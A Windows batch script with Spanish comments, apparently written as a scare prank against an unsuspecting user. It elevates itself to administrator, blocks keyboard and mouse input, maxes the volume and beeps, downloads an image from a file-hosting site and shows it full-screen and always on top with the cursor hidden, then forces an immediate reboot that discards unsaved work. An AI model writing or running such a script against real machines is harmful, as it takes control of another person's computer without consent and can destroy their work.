@echo off
:: 1. Elevación de privilegios (Para que el bloqueo de teclado funcione)
openfiles >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: 2. BLOQUEO TOTAL Y VOLUMEN AL MÁXIMO
rundll32.exe user32.dll,BlockInput 1
powershell -c "$w=New-Object -ComObject WScript.Shell;for($i=0;$i -lt 50;$i++){$w.SendKeys([char]175)}"

:: 3. PITIDOS DE ERROR (Hacen que el usuario mire la pantalla)
start /min powershell -c "for($i=0;$i -lt 5;$i++){[console]::beep(800,400)}"

:: 4. DESCARGAR LA IMAGEN Y MOSTRARLA A PANTALLA COMPLETA
:: La descarga en la carpeta temporal y la abre con un formulario de PowerShell que tapa TODO
set "img_url=https://files.catbox.moe/6v6206.jpg"
set "img_path=%temp%\image.jpg"

powershell -Command "Invoke-WebRequest -Uri '%img_url%' -OutFile '%img_path%'"

:: El comando de abajo crea la ventana con la imagen sin bordes (TopMost)
start /min powershell -WindowStyle Hidden -Command "& {Add-Type -AssemblyName System.Windows.Forms; $f = New-Object System.Windows.Forms.Form; $f.WindowState = 'Maximized'; $f.FormBorderStyle = 'None'; $f.TopMost = $true; $img = [System.Drawing.Image]::FromFile('%img_path%'); $pb = New-Object System.Windows.Forms.PictureBox; $pb.Image = $img; $pb.Dock = 'Fill'; $pb.SizeMode = 'StretchImage'; $f.Controls.Add($pb); $f.Cursor = [System.Windows.Forms.Cursors]::None; $f.ShowDialog()}"

:: 5. ESPERA DRAMÁTICA (6 segundos de puro susto)
timeout /t 6 /nobreak >nul

:: 6. GOLPE FINAL: REINICIO FORZOSO
shutdown /r /t 0 /f
